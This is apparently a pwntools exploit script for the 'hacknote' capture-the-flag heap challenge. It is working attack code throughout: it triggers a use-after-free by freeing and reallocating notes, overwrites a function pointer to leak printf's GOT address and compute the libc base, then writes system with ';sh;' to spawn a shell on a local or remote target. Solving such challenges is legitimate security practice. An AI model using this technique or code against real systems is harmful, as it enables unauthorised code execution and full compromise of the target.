from pwn import *

def con(argv=[], *a, **kw):
	if args.REMOTE:
		return remote(sys.argv[1], sys.argv[2], *a, **kw)
	elif args.GDB:
		return gdb.debug(exe, gdbscript='''
           
			c
			''')
	else:
		return process(exe)


exe = './hacknote'
libc = ELF("./libc_32.so.6")
ld = ELF("./ld-2.23.so")
io = con()
elf = context.binary = ELF(exe, checksec = False)

context.log_level = 'info'

#---------------------------------------------------------------------

def addnote(size, content):
    io.sendlineafter(b' :', b'1')
    io.sendlineafter(b'size :', size)
    io.sendlineafter(b'Content :', content)

def delnote(idx):
    io.sendlineafter(b' :', b'2')
    io.sendlineafter(b'Index :', idx)

def printnote(idx):
    io.sendlineafter(b' :', b'3')
    io.sendlineafter(b'Index :', idx)

# allocate 2 notes with 16 space for content

addnote(b'16', b'aaaa')
addnote(b'16', b'bbbb')

# free the 2 notes, now we have 2 size 8 fastbin and 2 size 16 fastbin

delnote(b'1')
delnote(b'0')

# allocate 1 note with size 8, now the puts pointer for note 1 will be allocated for our content
puts_function = 0x0804862b
addnote(b'8', p32(0x0804862b) + p32(elf.got['printf']))

# print the leaked libc

printnote(b'1')
leak = unpack(io.recv(4))
info(f'Leaked: {hex(leak)}')
libc.address = leak - libc.sym['printf']
info(f'Libc Base: {hex(libc.address)}')

system = libc.sym['system']

info(f'System: {hex(system)}')
delnote(b'2')
addnote(b'8', p32(system)+b';sh;')

printnote(b'1')

#--------------------------------------------------------------------
io.interactive()
